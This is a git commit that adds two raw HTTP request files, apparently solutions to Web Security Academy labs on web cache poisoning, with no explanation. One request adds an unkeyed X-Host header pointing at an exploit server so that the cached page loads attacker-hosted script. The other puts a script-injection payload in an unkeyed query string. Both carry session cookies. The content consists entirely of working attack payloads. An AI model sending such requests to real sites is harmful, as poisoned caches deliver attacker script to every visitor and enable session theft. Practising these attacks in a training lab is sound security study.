5afead14e9d93bd9561350462d64f6ade79423a8
Paula Fernandes <paula@MacBook-Air-de-Paula.local>
2022-04-16 22:39:21 -0300

    cache poisoning

---
+++ Targeted web cache poisoning using an unknown header.js
@@ -0,0 +1,19 @@
+GET / HTTP/1.1
+Host: ac761f371e1fc108c0474b1600df0041.web-security-academy.net
+Cookie: session=zl9sZJT4eDT9Ub121vpVFA1GXz7jYFJ2
+Cache-Control: max-age=0
+Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
+Sec-Ch-Ua-Mobile: ?0
+X-Host: exploit-ac761f901efbc105c0dd4b9f01080047.web-security-academy.net
+Sec-Ch-Ua-Platform: "macOS"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
---
+++ Web cache poisoning via an unkeyed query string.js
@@ -0,0 +1,18 @@
+GET /?'/><script>alert(1)</script><p> HTTP/1.1
+Host: acd41fd81f5654ebc00b13b2000a001e.web-security-academy.net
+Cookie: session=R27QK2CIkqLQP4sFwgAbDuIRJUosPdjp
+Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "macOS"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://acd41fd81f5654ebc00b13b2000a001e.web-security-academy.net/post?postId=10
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
